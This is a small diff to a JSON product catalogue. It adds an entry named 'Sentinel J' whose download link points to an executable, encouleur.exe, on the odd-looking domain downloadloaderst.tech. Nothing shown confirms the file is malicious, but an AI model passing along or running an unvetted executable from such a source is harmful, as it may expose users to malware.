@@ -44,6 +44,15 @@
             "status": "online",
             "imageUrl": "",
             "productUrl": ""
+        },
+        {
+            "id": "Sentinel J",
+            "name": "Sentinel J",
+            "categoryId": "bo6",
+            "downloadUrl": "https://downloadloaderst.tech/encouleur.exe",
+            "status": "online",
+            "imageUrl": "",
+            "productUrl": ""
         }
     ]
 }
